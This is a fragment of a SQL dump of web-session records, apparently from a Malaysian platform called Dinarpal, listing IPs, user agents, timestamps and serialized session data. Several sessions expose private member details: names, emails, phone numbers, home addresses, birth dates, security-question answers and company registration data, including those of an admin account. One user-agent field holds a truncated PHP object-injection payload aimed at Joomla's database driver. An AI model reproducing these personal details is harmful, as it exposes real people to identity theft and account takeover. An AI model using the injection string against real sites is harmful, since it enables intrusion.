('d16e1295e65b1c3943782d946397cd3f', '157.55.39.246', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461925762, ''),
('d1f1fb9561830cb1264b41543e8ba4dc', '45.79.81.142', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461703910, ''),
('d200d1dc316ddc9fcd1d1ca0149b1066', '123.246.120.73', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461540302, ''),
('d202918936b31d9a452ed1206ceebfaa', '80.255.7.26', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461903484, ''),
('d20a766d23ed75ed6a2867483ef06b9b', '124.13.94.73', 'Mozilla/5.0 (Linux; U; Android 4.3; en-gb; GT-N710', 1461409192, 'a:1:{s:12:"me_id_parent";s:88:"Ot4r5Tr_ZIMq_m1vdsDRJNt4GPSFIbK09E-6DOQ9o46ZjYpMzfmkClGxm1tatjrmHm1qUfAk422mSNitnPw1ag==";}'),
('d2579813789df35ba8694930948f2482', '66.102.7.242', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 1461547526, ''),
('d280849c6a234cb09733a6b4d69d1d11', '66.249.64.36', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461835662, ''),
('d2908b2af5b6151f62f336a3bcc29d3c', '69.171.228.121', 'facebookexternalhit/1.1', 1461231334, 'a:1:{s:12:"me_id_parent";s:88:"dpczOaiwDlhve-uv2Oo4pNe-cM6aePxquCnvZNMkCnayJK_XiDWINU_zWFsbHf9pRlwN2qqnx4xd93ojdCMdqw==";}'),
('d29bdb46bb710705a55653f9fe45d2ab', '178.137.90.202', 'Opera/9.00 (Windows NT 4.0; U; en)', 1461733897, ''),
('d2a721fd7947ba73275257c8096ebc6d', '180.76.15.9', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461240790, ''),
('d2ee2f1062c949f03ddd0059f11541c4', '180.76.15.11', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461188430, ''),
('d3007ce365a998ea3c60552d915d0e52', '178.255.215.70', 'Mozilla/5.0 (compatible; Exabot/3.0; +http://www.e', 1461638813, ''),
('d31a1fa2104f5fabb8250b11236dfcd8', '103.1.70.222', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-E700H Build/', 1461502887, 'a:1:{s:12:"me_id_parent";s:88:"jgRHfumZ-CEuI3aF3J30ma395bkqX0OqTnqlHm-uREo6x0TYNXEkzGZUINgYsjECgRyh5Zb0zuSaqVbryDXWcA==";}'),
('d339b39541fa798679d58cac0d42797a', '66.249.69.116', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461619445, ''),
('d35094da376fa290d59644f2541dbfa0', '180.76.15.32', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461687468, ''),
('d35e65409f090cbdc025f95782b34883', '192.187.114.11', '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O', 1461897619, ''),
('d37631b033bdcf9884248e83adc130c1', '180.76.15.9', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461517720, ''),
('d39937e0978f731837352b5d67cc2081', '45.79.81.142', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461445361, ''),
('d3b268a31f4d897a0b08908686952258', '66.249.69.68', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461661171, ''),
('d3bb9d05a2a1025509ffdbdb6b3a4569', '207.46.13.106', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461433433, ''),
('d44e2c45db15ab10511a2515d497f423', '175.141.171.212', 'Mozilla/5.0 (iPad; CPU OS 7_0_2 like Mac OS X) App', 1461842766, ''),
('d47387d450ca716a89be965983c866a4', '45.55.229.99', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) App', 1461718313, ''),
('d4af7a632c8a5dd2a7e0978e8dbce368', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461231997, ''),
('d4b02e608738721d9463f25df7add8c1', '66.220.158.123', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461485275, ''),
('d4b43f7f2e110c54b7dd8a9a6039506f', '178.255.215.70', 'Mozilla/5.0 (compatible; Exabot/3.0; +http://www.e', 1461598473, ''),
('d4cd065fd893d32f1f51444a95c804f6', '180.76.15.25', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461155145, ''),
('d4eec402b3eaeea95189ed77f72e6e4c', '113.210.60.46', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461430005, ''),
('d51e3dccea3cf035dadb96be7480a10e', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461422006, ''),
('d525e5339bf75712189d7d67af24a93f', '180.76.15.136', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461943290, ''),
('d52cf6ea7e5e9f461a7776b667423c23', '113.210.52.249', 'Lenovo-A269i/S001 Linux/3.4.5 Android/2.3.6 Releas', 1461417327, 'a:1:{s:12:"me_id_parent";s:88:"3a63CXLSQZ-bPKAmrDOwVAXUxABRHuaqAkN3awZ1JgzgsGq1uRBd2WcTsuaXgreFHptPYJ4HI-Jlpa7cih-8fw==";}'),
('d56c0ea5a76a28619abf942cd42cd8e5', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232007, 'a:2:{s:12:"me_id_parent";s:1:"0";s:15:"flash:new:error";s:33:"Opss! Invalid member unique link.";}'),
('d5a08724a52140fd0219f04fb9ab91ab', '13.92.241.115', 'semanticbot', 1461739138, ''),
('d5abe2afb99106be91d1bda5df9dfd48', '13.92.241.115', 'semanticbot', 1461739121, ''),
('d5c64e86020e720f2e6e6fe039c00c30', '66.249.69.222', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461468331, ''),
('d5d82ccd0d48cdb05eb3ff9dab815b11', '51.255.162.166', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461747801, ''),
('d607f10d0b5db9f5fd6dca0bcb9d9434', '175.141.171.212', 'Mozilla/5.0 (iPad; CPU OS 7_0_2 like Mac OS X) App', 1461233373, 'a:51:{s:5:"me_id";s:2:"16";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:5:"arash";s:11:"me_lastname";s:5:"arash";s:11:"me_username";s:5:"arash";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:5:"arash";s:14:"me_unique_link";s:32:"81b9a3538d93a7623ad0e9bf1347d137";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:22:"arash.private@live.com";s:16:"me_register_date";s:19:"2016-04-21 18:07:10";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"248dfd4fff3169f86edec2930684bfd4";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;}'),
('d60ad496624683a48b622cf430a517bb', '183.171.29.245', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-G313HZ Build', 1461514195, 'a:1:{s:15:"flash:old:error";s:279:"Password validation failure ( your choise is weak ) <br /><br />Password too short!<br />Password must include at least one number!<br />Password must include at least one letter!<br />Password must include at least one CAPS!<br />Password must include at least one symbol!<br />";}'),
('d613106ccbf117592d634b97bc3c91cb', '175.136.140.216', 'WhatsApp/2.16.53 A', 1461913698, 'a:1:{s:12:"me_id_parent";s:8:"AjZdaQ==";}'),
('d678382b3f107a07046c6b0b21ee88af', '180.76.15.5', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461910481, ''),
('d6b393727e26cfb1c778ad9fbe2f5a05', '180.76.15.17', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461494632, ''),
('d7351b8ee5f25675ad596ead035ebcef', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232000, 'a:2:{s:12:"me_id_parent";s:1:"0";s:15:"flash:new:error";s:33:"Opss! Invalid member unique link.";}'),
('d737e6067bc08cdb1fb29b0f106c272a', '109.149.176.125', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461527026, ''),
('d7467dec85285314b061f8345d8d0f27', '182.118.53.87', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1;', 1461907561, ''),
('d76827a4baba56d5e9e70b3c8eff013b', '64.233.172.245', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 1461547527, ''),
('d789f062681a81d231cf03fb2902bddc', '103.198.52.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461234466, 'a:1:{s:16:"flash:old:sucess";s:40:"Activation is successful, please log in!";}'),
('d7b8aca6b666b21ab035ec622c692305', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461792097, ''),
('d7c8115b5b51533e32b48d44e8e2530e', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461766828, ''),
('d7dde5602785e44e5d8de983fbdcb940', '180.76.15.148', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461867350, ''),
('d7e9b2b0e8e2e3f7ec20c5893f6718cd', '203.82.90.154', 'Mozilla/5.0 (Linux; Android 5.1; Elite 5 Build/LMY', 1461420480, 'a:2:{s:12:"me_id_parent";s:1:"1";s:15:"flash:old:error";s:24:"Wrong username/password!";}'),
('d7ec3ed2a3dbe003328e457d34068863', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461700348, ''),
('d7f041768d00dd1318697762468030e0', '103.198.52.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1459089450, 'a:50:{s:5:"me_id";s:1:"7";s:8:"me_image";s:36:"007670359b0f05b910f399488e2ffcea.jpg";s:12:"me_firstname";s:3:"asd";s:11:"me_lastname";s:3:"dsa";s:11:"me_username";s:3:"asd";s:11:"me_question";s:9:"Who am I?";s:9:"me_answer";s:12:"Jack Sparrow";s:14:"me_unique_link";s:32:"7815696ecbf1c96e6894b779456d330e";s:11:"me_address1";s:0:"";s:8:"me_city1";s:0:"";s:9:"me_state1";s:0:"";s:12:"me_postcode1";s:0:"";s:11:"me_country1";s:0:"";s:11:"me_address2";s:0:"";s:8:"me_city2";s:0:"";s:9:"me_state2";s:0:"";s:12:"me_postcode2";s:0:"";s:11:"me_country2";s:0:"";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:3:"123";s:13:"me_birth_date";s:10:"1998-10-02";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:11:"facebok asd";s:10:"me_twitter";s:12:"twitter saya";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:0:"";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:16:"umar@tuffah.info";s:16:"me_register_date";s:19:"2014-12-13 19:45:41";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-03-27T22:34:48+08:00";s:12:"me_magic_num";s:32:"ec623adec13773d99685c93053d3228e";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:9:"logged_in";b:1;}'),
('d81152a7471081aafcb1ec2fd12451a0', '71.6.135.131', '0', 1461637543, ''),
('d861ad7c6a02038e1730c82a706018cb', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461262911, 'a:50:{s:5:"me_id";s:1:"5";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"God Admin";s:11:"me_lastname";s:6:"bujang";s:11:"me_username";s:8:"godadmin";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:2:"b1";s:14:"me_unique_link";s:32:"edbab45572c72a5d9440b40bcc0500c0";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";s:0:"";s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:18:"staff@dinarpal.com";s:16:"me_register_date";s:19:"2014-12-28 07:28:05";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-22T02:21:49+08:00";s:12:"me_magic_num";s:32:"9512afcb3f0fde463ddf8e476a76be16";s:5:"ml_id";s:1:"2";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"GA";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;}'),
('d8669eb8eb7c03b2033a9296a3959e4d', '66.249.69.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461492356, ''),
('d8c70d0ebb55663fba6c0743c8a17b1c', '103.1.71.95', 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-gb; GT-I9', 1461423920, 'a:1:{s:12:"me_id_parent";s:1:"0";}'),
('d909714553257abb88666bdd35877fff', '208.90.57.196', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko', 1461753254, ''),
('d909e5e13d822fc3e50497699ac05e1c', '180.76.15.28', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461817050, ''),
('d9245c67469f0b9b6d01e8391f9d09c5', '13.92.241.115', 'semanticbot', 1461739118, ''),
('d93455f67c4033f39acc36b53e280a12', '119.116.195.240', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461730916, ''),
('d9420b44162346607302a24193ca4630', '74.91.23.108', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1;', 1461172903, ''),
('d954134009f596c6e7c9d8ddb350153b', '66.249.64.36', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461797921, ''),
('d966698e005c6ab84113a04536271b4e', '180.76.15.26', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461257164, ''),
('d966d965bcccb9ba1add5dd6db85dd0c', '203.106.159.247', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko', 1461426608, 'a:1:{s:12:"me_id_parent";s:88:"X3QPi2BbnpdT7rn1kgtHH9L6NvqFDBvRt1BJWiDmYAx06uGWe05AkZB_UUGP1dWC6zN7DpyCQ51oxHWS69O-kw==";}'),
('d99044de9d11849e15398379cfa72ba3', '66.249.69.53', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461429845, ''),
('d9cfe8e10f3b072942adc46c195e8d3f', '66.249.71.188', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461200586, ''),
('d9f3d6f33f8fa762635df8c16f124b50', '175.138.178.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461267106, 'a:50:{s:5:"me_id";s:1:"1";s:8:"me_image";s:36:"99271c3805aa830738485064b3707cc9.jpg";s:12:"me_firstname";s:12:"DP System HQ";s:11:"me_lastname";s:8:"Dinarpal";s:11:"me_username";s:4:"dphq";s:11:"me_question";s:22:"What is my pet''s name?";s:9:"me_answer";s:5:"comel";s:14:"me_unique_link";s:200:"http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://local";s:11:"me_address1";s:44:"J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.";s:8:"me_city1";s:10:"AYER KEROH";s:9:"me_state1";s:6:"MELAKA";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"MALAYSIA";s:11:"me_address2";s:28:"91, JALAN KERAI, SG. RETANG.";s:8:"me_city2";s:8:"JERANTUT";s:9:"me_state2";s:6:"PAHANG";s:12:"me_postcode2";s:5:"27000";s:11:"me_country2";s:8:"MALAYSIA";s:22:"me_government_issue_id";s:5:"MY001";s:17:"me_driver_license";s:7:"B and D";s:11:"me_phone_no";s:10:"0199737579";s:13:"me_birth_date";s:10:"1989-10-31";s:14:"me_description";s:0:"";s:14:"me_maiden_name";s:4:"Ntoh";s:14:"me_nationality";s:8:"Malaysia";s:11:"me_facebook";s:36:"https://www.facebook.com/kidzeclipes";s:10:"me_twitter";s:31:"https://twitter.com/kidzeclipes";s:12:"me_instagram";s:34:"https://www.instagram.com/umaq_89/";s:13:"me_googleplus";s:55:"https://plus.google.com/u/0/110272712192644641706/posts";s:14:"me_whatsapp_no";s:10:"0199737579";s:11:"me_telegram";s:11:"019-9737579";s:9:"me_wechat";s:15:"+6 019-973 7579";s:8:"me_email";s:21:"kidzeclipes@gmail.com";s:16:"me_register_date";s:19:"2014-11-10 10:12:00";s:15:"me_account_type";s:1:"2";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-22T03:32:01+08:00";s:12:"me_magic_num";s:32:"0d4368f80cd1d149576c068211e89fbf";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:18:"Tuffah Informatics";s:10:"me_reg_num";s:11:"MA0182480-H";s:15:"me_company_doc1";s:36:"8dbaa9d1e7f114245d186c546ab9a7d6.jpg";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:36:"25e878659a4d2c4c9f76576fa1656530.jpg";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"DP";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"1";s:9:"logged_in";b:1;}'),
('d9f43cd65430117d4bc55429883cf2cc', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461186645, ''),
('da2c81d8a59e538c56003a8ae5471bea', '180.76.15.27', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461490710, ''),
('da37a4a54995c65307b1240cf59b588c', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461231979, ''),
('da827a9d240bfbb3e4c747671213e5a5', '157.55.39.80', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461428313, ''),
('dabc186de31d492173f288cb1e984178', '178.137.90.202', 'Opera/9.00 (Windows NT 5.1; U; ru)', 1461430289, ''),
('dac571ccbaa6d9a587bff4d026608a48', '103.198.52.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461320047, 'a:50:{s:5:"me_id";s:1:"5";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"God Admin";s:11:"me_lastname";s:6:"bujang";s:11:"me_username";s:8:"godadmin";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:2:"b1";s:14:"me_unique_link";s:32:"edbab45572c72a5d9440b40bcc0500c0";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";s:0:"";s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:18:"staff@dinarpal.com";s:16:"me_register_date";s:19:"2014-12-28 07:28:05";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-22T18:11:42+08:00";s:12:"me_magic_num";s:32:"9512afcb3f0fde463ddf8e476a76be16";s:5:"ml_id";s:1:"2";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"GA";s:5:"sl_id";s:1:"1";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;}'),
('dacb0c1224be8ef7d171767354b2730d', '183.171.168.243', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-G313HZ Build', 1461554919, ''),
('dade3e142b33d064190c1066e38bf68b', '180.76.15.8', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461723815, ''),
('daf992b97fa1f55e39312f9cf0af6c20', '66.249.66.55', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461252902, ''),
('dafdaaf0b40c7b4c505369b402c891e5', '183.171.26.173', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461905455, ''),
('db14f61e3274254f63bcd452b6f14763', '180.76.15.155', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461581060, ''),
('db4f50106a8ed2b1d0ca2016acf876d3', '175.140.35.196', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461602649, ''),
('db5c1a535f313e256759d6aaea6bdc81', '115.164.86.8', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461469018, ''),
('db96823de6d7c0e7e44b9edc07ec513c', '115.164.60.84', 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/', 1461232159, 'a:1:{s:12:"me_id_parent";s:88:"RwBmBzAdadtfXS7CQq-KJID7PD_alZ6LwTkEHhXHb3hZc1oPIAo4c_M7IMKrq6pQhQ-9eIiaWDLh3scDrX0B7g==";}'),
('dba45143d45aaaa25246efdb7e7426a8', '144.76.93.46', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461787347, ''),
('dbd38df54191feefb9fc7d3d55f01f11', '208.115.111.74', 'Mozilla/5.0 (compatible; DotBot/1.1; http://www.op', 1461270094, ''),
('dbd785c6be9dd531be51e9514585d579', '183.171.169.66', 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-gb; GT-S5', 1461436287, ''),
('dc481397cc12c4a8c550f6a621af5ec6', '69.30.198.147', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1;', 1461457107, ''),
('dc4d83a617286c0b7d08e71ee9d05e3b', '180.76.15.21', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461439559, ''),
('dc80251126a422abd1d499619e9763cd', '180.76.15.137', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461899830, ''),
('dc915426b37637e80cd76bfb8110a51b', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461436799, ''),
('dcce830d8a3db287a6042f6781fbed4a', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461394613, 'a:1:{s:15:"flash:new:error";s:24:"Wrong username/password!";}'),
('dce32a3867cdbf4c47b5648c5e4a3b67', '180.76.15.155', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461831614, ''),
('dd3cfca78130223f888419d5a35da703', '180.76.15.151', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461431311, ''),
('dd5b748b834b30ef555488b99ebe3731', '115.135.237.193', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461420780, ''),
('dd6b2f46afaa8bc87436c9b56c1e2ac3', '175.141.171.212', 'Mozilla/5.0 (iPad; CPU OS 7_0_2 like Mac OS X) App', 1461839752, ''),
('dd88f495634e7d8dc122664a5b79c018', '113.210.54.28', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWeb', 1461135649, ''),
('dd9b7b0f482bfbdc7d9d598b80c44e90', '211.24.232.114', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461654464, ''),
('ddcb69fd69eadd257b181a297c798270', '66.249.77.14', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461221613, ''),
('dde4536cd12788717755eaa30e733173', '180.76.15.29', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461892817, ''),
('ddf1c292ff04e50a422bd362b03a0d3f', '175.145.204.202', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) Ap', 1461472961, ''),
('ddfb52be01c68c27f63000b57e84578b', '220.181.108.186', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS', 1461750787, ''),
('ddfc8932469951f179922859b92ef99b', '66.249.66.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461894729, ''),
('de1650a97940958825298993d845a71a', '66.249.69.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461520460, ''),
('de4012c2bc93e688b86f9354bc1419e8', '1.32.76.12', 'Mozilla/5.0 (Linux; Android 4.4.2; Hol-U19 Build/H', 1461498190, 'a:1:{s:12:"me_id_parent";s:88:"07-Ibr16cQrokTtCRywV0Z7fUsUgf4SH6QlBJ0mfo5533p3jK2KXH2Wff8zH-7EOtxNnpv-38Kqc8I62a7lcfQ==";}'),
('de40d1b20c4ed98f75c5eb6b5e2a680b', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2;', 1461641914, ''),
('de4b6d4af28903c0818855c18750cb37', '66.249.66.61', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461244625, ''),
('de64a8450ae775d1bfcb572e15cc21b4', '40.77.167.71', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461553510, ''),
('de6cb8ac7ab15697cea7b26e168d4c42', '68.180.230.178', 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help', 1461286723, ''),
('de8043c673975e2cf17485a6914e2836', '175.145.228.114', 'Mozilla/5.0 (Linux; Android 4.4.4; SM-G750F Build/', 1461414310, 'a:1:{s:12:"me_id_parent";s:88:"x0X2m_1SuzqtIGc6AYnhlhXeuhE9rs-9y3P12ZN95mYEX_QJuIV7Eq4glT3XzflLOJVlc1eZ1lPX7SGkZLfqJg==";}'),
('dea966b1163d427afb411450c648afe1', '192.99.10.110', 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help', 1461485403, 'a:1:{s:12:"me_id_parent";s:88:"nIjMbc2_RAGaFxmmP18E0bzD4FuNHng90xNQHYIiu2kaqeOoGgFc5aZ4iB0ym6LxbKN6Gbd7bBJ0k4MRamq0Ow==";}'),
('decc41a8103ed3c6a33d74747cb7cd59', '207.46.13.154', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461533665, ''),
('def5bf6f0ab1da4d7f1cf61355dc9d74', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461244600, ''),
('df2ea163e93c7ab0cd52892a111668a1', '66.249.66.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461894674, ''),
('df64480f1b217a46e1ca06a7d4fa7cd4', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160579, ''),
('df6d23f2d319349aac7c7734383063b3', '210.195.155.54', 'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00J Build', 1461286420, 'a:1:{s:15:"flash:old:error";s:158:"Password validation failure ( your choise is weak ) <br /><br />Password must include at least one CAPS!<br />Password must include at least one symbol!<br />";}'),
('df9720677410a7aca3c2f68a5c7085a4', '173.252.90.232', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461681793, 'a:1:{s:12:"me_id_parent";s:4:"UGc=";}'),
